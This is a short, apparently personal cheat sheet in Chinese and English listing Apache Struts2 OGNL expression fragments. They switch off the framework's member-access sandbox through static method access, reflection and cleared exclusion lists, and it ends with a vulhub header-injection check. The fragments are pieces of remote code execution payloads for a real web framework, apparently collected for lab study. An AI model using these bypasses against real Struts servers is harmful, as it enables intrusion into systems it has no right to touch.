<!-- Created by Frank -->
# Classification

## 权限语句 (possible)
* #_memberAccess.allowStaticMethodAccess=true
* 使用反射(新版)  
  #f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true)
* #context["xwork.MethodAccessor.denyMethodExecution"]=false
* #_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET  
  设置外部拦截器为空
* #_memberAccess['allowPrivateAccess']=true
* #_memberAccess['allowProtectedAccess']=true
* #_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties']
* #_memberAccess['excludedClasses']=#_memberAccess['acceptProperties']
* #_memberAccess['allowPackageProtectedAccess']=true
* #_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS
* #context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)

## 1. 包名

## 2. 包名 + 类名

## 3. 其他